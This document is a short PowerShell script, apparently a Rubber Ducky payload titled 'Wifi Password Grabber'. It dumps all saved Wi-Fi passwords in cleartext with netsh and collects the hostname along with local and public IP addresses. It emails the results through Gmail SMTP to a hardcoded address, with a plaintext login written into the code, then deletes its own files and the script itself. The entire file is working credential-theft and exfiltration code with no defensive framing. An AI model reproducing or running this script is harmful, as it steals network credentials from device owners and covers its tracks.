$p = "C:\IT"
mkdir $p
cd $p

# netsh
netsh wlan export profile key=clear
dir *.xml |% {
$xml=[xml] (get-content $_)
$a= $xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File C:\IT\info.txt -Append -InputObject $a
}

# IP Info
$command = {hostname; Get-NetIpaddress | Where PrefixOrigin -EQ DHCP; Invoke-RestMethod http://ipinfo.io/json | Select -exp ip};$command.InvokeReturnAsIs() | Out-File C:\IT\info.txt -Append


$FROM = "patitodegoma404@gmail.com"
$PASS = "RubberDucky404!"
$TO = "patitodegoma404@gmail.com"

$PC_NAME = "$env:computername"
$USER_NAME = "$env:UserName"
$SUBJECT = "Wifi Password Grabber - " + $PC_NAME + " " + $USER_NAME
$BODY = "All the wifi passwords that are saved to " + $PC_NAME + " from " + $USER_NAME + " are in the attached file."
$ATTACH = "C:\IT\info.txt"

Send-MailMessage -SmtpServer "smtp.gmail.com" -Port 587 -From ${FROM} -to ${TO} -Subject ${SUBJECT} -Body ${BODY} -Attachment ${ATTACH} -Priority High -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ${FROM}, (ConvertTo-SecureString -String ${PASS} -AsPlainText -force))

rm $p\*.xml
rm $p\*.txt
cd ..
rm $p
rm d.ps1
